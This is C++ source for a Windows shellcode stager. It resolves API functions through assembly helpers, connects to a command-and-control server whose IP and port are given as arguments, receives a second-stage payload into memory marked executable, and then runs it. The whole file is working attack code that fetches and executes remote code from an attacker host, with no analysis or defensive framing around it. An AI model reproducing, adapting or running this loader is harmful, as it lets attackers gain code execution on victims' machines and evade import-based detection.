#include <Windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>

extern "C" HANDLE __fastcall GetKernel32ModuleHandle();
extern "C" FARPROC __fastcall GetAddressOfGetProcAddress(HANDLE kernel32);
extern "C" FARPROC __fastcall asmGetProcAddress(void* libAddress, const char* funcName, FARPROC GetProcAddress);
extern "C" HMODULE __fastcall asmLoadLibrary(const char* libName, FARPROC LoadLibraryA);
extern "C" int __fastcall asmWSAStartup(int version, LPWSADATA wsadata, FARPROC funcAddress);
extern "C" SOCKET __fastcall asmWSASocketA(FARPROC funcAddress);
extern "C" int __fastcall asmConnect(SOCKET s, const char * ip, int port, FARPROC funcAddress);
extern "C" int __fastcall asmRecv(SOCKET s, void * buf, int size, FARPROC funcAddress);
extern "C" LPVOID __fastcall asmVirtualAlloc(FARPROC funcAddress, int stageSize, DWORD flAllocationType, DWORD flProtect);
extern "C" LPVOID __fastcall asmVirtualProtect(void* addr, int stageSize, DWORD flNewProtect, FARPROC funcAddress);

int main(int argc, const char* argv[])
{
	const char* ip;
	int port;

	if (argc != 3)
	{
		printf("[-] please specify the IP address and port number of the C2 server. Exiting...");
		return 1;
	}
	else
	{
		ip = argv[1];
		port = strtol(argv[2], NULL, 10);
	}

	WSADATA WSAData;
	SOCKET socket = 0;
	int stageSize = 0;
	int bytesReceived = 0;

	HANDLE kernel32 = GetKernel32ModuleHandle();
	printf("[+] Loaded kernel32.dll: 0x%x\n", kernel32);
	FARPROC GetProcAddress = GetAddressOfGetProcAddress(kernel32);
	printf("[+] Found GetProcAddress function: 0x%x\n", GetProcAddress);
	
	FARPROC LoadLibraryA = asmGetProcAddress(kernel32, "LoadLibraryA", GetProcAddress);
	printf("[+] Found LoadLibraryA: 0x%x\n", LoadLibraryA);
	HMODULE ws2_32 = asmLoadLibrary("ws2_32", LoadLibraryA);
	printf("[+] Loaded ws2_32.dll: 0x%x\n", ws2_32);
	FARPROC wsastartup = asmGetProcAddress(ws2_32, "WSAStartup", GetProcAddress);
	printf("[+] Found WSAStartup function: 0x%x\n", wsastartup);
	FARPROC wsasocketa = asmGetProcAddress(ws2_32, "WSASocketA", GetProcAddress);
	printf("[+] Found WSASocketA function: 0x%x\n", wsasocketa);
	asmWSAStartup(0x0101, &WSAData, wsastartup);
	socket = asmWSASocketA(wsasocketa);
	printf("[+] Obtained pointer to SOCKET: 0x%x\n", socket);
	FARPROC connect = asmGetProcAddress(ws2_32, "WSAConnect", GetProcAddress);
	printf("[+] Found Connect function: 0x%x\n", connect);
	asmConnect(socket, ip, port, connect);
	FARPROC recv = asmGetProcAddress(ws2_32, "recv", GetProcAddress);
	printf("[+] Found Recv function: 0x%x\n", recv);
	asmRecv(socket, &stageSize, 4, recv);
	printf("[+] Obtained stage size: %d\n", stageSize);

	kernel32 = GetKernel32ModuleHandle();

	FARPROC virtualAlloc = asmGetProcAddress(kernel32, "VirtualAlloc", GetProcAddress);
	printf("[+] Found virtualAlloc function: 0x%x\n", virtualAlloc);
	LPVOID addr = asmVirtualAlloc(virtualAlloc, stageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	printf("[+] Allocated Memory for the stage: 0x%x\n", addr);
	LPVOID addrBak = addr;

	do
	{
		bytesReceived = asmRecv(socket, addr, stageSize, recv);
		printf("Bytes received: %d\n", bytesReceived);
		printf("Left: %d\n", stageSize = stageSize - bytesReceived);
		addr = ((char *) addr) + bytesReceived;
	} while (stageSize != 0); 
	
	((void(*)())addrBak)();
	
	return 0;
}

extern "C" long long convertIpToLong(const char * ip)
{
	// convert IP to unsigned long 
	char c;
	c = *ip;
	unsigned int integer;
	int val;
	int i, j = 0;
	for (j = 0; j < 4; j++) {
		val = 0;
		for (i = 0; i < 3; i++) {
			if (isdigit(c)) {
				val = (val * 10) + (c - '0');
				c = *++ip;
			}
			else
				break;
		}
		if (val < 0 || val>255) {
			return (0);
		}
		if (c == '.') {
			integer = (integer << 8) | val;
			c = *++ip;
		}
		else if (j == 3 && c == '\0') {
			integer = (integer << 8) | val;
			break;
		}

	}

	return htonl(integer);
}
